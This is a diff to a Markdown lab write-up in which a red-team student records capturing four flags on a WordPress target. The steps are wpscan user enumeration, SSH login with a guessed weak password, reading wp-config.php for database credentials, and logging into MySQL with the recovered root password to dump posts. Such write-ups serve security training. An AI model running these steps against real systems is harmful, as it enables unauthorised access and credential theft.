@@ -74,39 +74,66 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   - ***_flag1.txt_***: `flag1{b6bbcb33e11b80be759c4e844862482d}` 
 
 **Exploit Used**
+
+***_flag1.txt_***
 - Enumerated the WordPress site using wpscan
+
   > Command: wpscan --url http://192.168.1.110/wordpress -eu
   
-![wpscan1](../images/wpscan1.JPG)
-![wpscan2](../images/wpscan2.JPG)
-![wpscan3](../images/wpscan3.JPG)
+    ![wpscan1](../images/wpscan1.JPG)
+    ![wpscan2](../images/wpscan2.JPG)
+    ![wpscan3](../images/wpscan3.JPG)
 
 - I then went to the IP address via a web browser and inspected the page source to find the first flag.
 
-![webpage_target1](../images/webpage_target1.JPG)
-![flag1.2](../images/flag1.2JPG)
-![flag1](../images/flag1.JPG)
+  ![webpage_target1](../images/webpage_target1.JPG)
+  
+  ![flag1.2](../images/flag1.2.JPG)
+  
+  ![flag1](../images/flag1.JPG)
+
+---
 
 ***_flag2.txt_***: `flag2{fc3fd58dcdad9ab23faca6e9a36e581c}`
 **Exploit Used**
+
 - Using SSH to gain access to Michael's account
+
   > Command: `ssh michael@192.68.1.110`
   > Enter Password: `michael`
 
-![ssh_command](../images/ssh_command.JPG)
+  ![ssh_command](../images/ssh_command.JPG)
 
-> Command: `cd /var/www`
-> Command: `ls`
+  > Command: `cd /var/www`
+  > Command: `ls`
 
-![flag2](../images/flag2.JPG)
+  ![flag2](../images/flag2.JPG)
 
-`flag3.txt`: _TODO: Insert `flag2.txt` hash value_
-    - **Exploit Used**
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
+---
 
+***_flag3.txt & flag4.txt_***: `flag3{a0f568aa9de277887f37730d71520d9b}` & `flag4{{715dea6c055b9fe3337544932f2941ce}`
+**Exploit Used**
+  - Using the SSH shell above, I navigated to `/wordpress`
+      
+    > Command: `cd /var/www/html/wordpress`
+    > Command: `ls`
+        
+    ![wordpress_config](../images/wordpress_config_directory.JPG)
 
-  - `flag4.txt`: _TODO: Insert `flag2.txt` hash value_
-    - **Exploit Used**
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
+    > Command: `less wp-config.php`
+        
+    ![wp_config_keys](../images/wp_config_keys.JPG)
+    ![wp_config_username_password](../images/wp_config_username_password.JPG)
+
+    > Command: `mysql -u root -p`
+    > Password: `R@v3nSecurity`
+        
+    ![mysql_login](../images/mysql_login.JPG)
+
+    > Command: `show databases;`
+    > Command: `use wordpress;`
+    > Command: `show tables;`
+    > Command: `select * from wp_posts;`
+      
+    ![flag3_and_4](../images/flag3_and_4.JPG)
+        
